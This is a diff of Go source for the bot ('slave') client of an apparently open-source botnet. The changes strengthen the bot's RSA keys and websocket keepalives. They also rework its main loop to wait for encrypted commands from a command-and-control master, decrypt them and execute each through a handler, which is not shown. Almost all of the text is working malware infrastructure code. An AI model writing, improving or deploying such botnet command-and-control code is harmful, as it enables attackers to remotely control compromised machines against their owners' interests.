@@ -16,6 +16,13 @@ import (
 	"github.com/adrianosela/botnet/master"
 )
 
+const (
+	writeWait      = 10 * time.Second    // Time allowed to write a message to the peer
+	pongWait       = 60 * time.Second    // Time allowed to read the next pong message from the peer
+	pingPeriod     = (pongWait * 9) / 10 // Send pings to peer with this period. Must be less than pongWait
+	maxMessageSize = 512                 // Maximum message size allowed from peer
+)
+
 // BotnetSlave is the slave program controller
 type BotnetSlave struct {
 	masterAddr   string
@@ -31,7 +38,7 @@ func NewBotnetSlave(masterAddr string) (*BotnetSlave, error) {
 		return nil, err
 	}
 	log.Printf("[slave] fetched master pub key: \n%s", rawPEM)
-	slavePriv, slavePub, err := encryption.GenerateRSAKeyPair(1024)
+	slavePriv, slavePub, err := encryption.GenerateRSAKeyPair(4096)
 	if err != nil {
 		return nil, err
 	}
@@ -56,9 +63,8 @@ func (s *BotnetSlave) Start() {
 		log.Fatal("dial:", err)
 	}
 	defer c.Close()
-	done := make(chan *protocol.Event)
 
-	// send encrypted join request
+	// send encrypted join request completing the handshake
 	encrypted, err := buildEncryptedJoinRequest(s.slavePubKey, s.masterPubKey)
 	if err != nil {
 		log.Fatal(err)
@@ -66,56 +72,36 @@ func (s *BotnetSlave) Start() {
 
 	c.WriteMessage(2, []byte(encrypted)) // binary message type (2)
 
-	go func() {
-		defer close(done)
-		for {
-			messageType, message, err := c.ReadMessage()
-			if err != nil {
-				log.Println("read:", err)
-				return
-			}
-			// discard non binary type messages
-			if messageType != 2 {
-				continue
-			}
-			decryptedJSON, err := encryption.DecryptMessage(message, s.slavePrivKey)
-			if err != nil {
-				log.Printf("could not decrypt binary message: %s", err)
-				continue
-			}
-			var e protocol.Event
-			if err := json.Unmarshal(decryptedJSON, &e); err != nil {
-				log.Printf("could not unmarshal json message: %s", err)
-				continue
-			}
-			go protocol.HandleMasterEvent(e)
-		}
-	}()
-
-	ticker := time.NewTicker(time.Second)
-	defer ticker.Stop()
+	c.SetReadLimit(maxMessageSize)
+	c.SetReadDeadline(time.Now().Add(pongWait))
+	c.SetPongHandler(func(string) error { c.SetReadDeadline(time.Now().Add(pongWait)); return nil })
 
 	for {
-		select {
-		case <-done:
-			return
-		case t := <-ticker.C:
-			err := c.WriteMessage(websocket.TextMessage, []byte(t.String()))
-			if err != nil {
-				log.Printf("write error: %s", err)
-				return
+		log.Println("waiting for command and control...")
+		msgType, encryptedMessage, err := c.ReadMessage()
+		log.Printf("we have comm with err: %s", err)
+		if err != nil {
+			if websocket.IsUnexpectedCloseError(err, websocket.CloseGoingAway, websocket.CloseAbnormalClosure) {
+				log.Printf("WS connection was closed unexpectedly: %s", err)
 			}
-		case <-interrupt:
-			err := c.WriteMessage(websocket.CloseMessage, websocket.FormatCloseMessage(websocket.CloseNormalClosure, ""))
-			if err != nil {
-				log.Printf("write close error: %s", err)
-				return
-			}
-			select {
-			case <-done:
-			case <-time.After(time.Second):
-			}
-			return
+			break
 		}
+
+		// discard all non binary messages
+		if msgType != 2 {
+			continue
+		}
+
+		jsonMsg, err := encryption.DecryptMessage(encryptedMessage, s.slavePrivKey)
+		if err != nil {
+			log.Printf("could not decrypt message from master: %s", err)
+			continue
+		}
+		var event protocol.Event
+		if err = json.Unmarshal(jsonMsg, &event); err != nil {
+			log.Printf("could not unmarshal message from master: %s", err)
+			continue
+		}
+		protocol.HandleMasterEvent(event)
 	}
 }
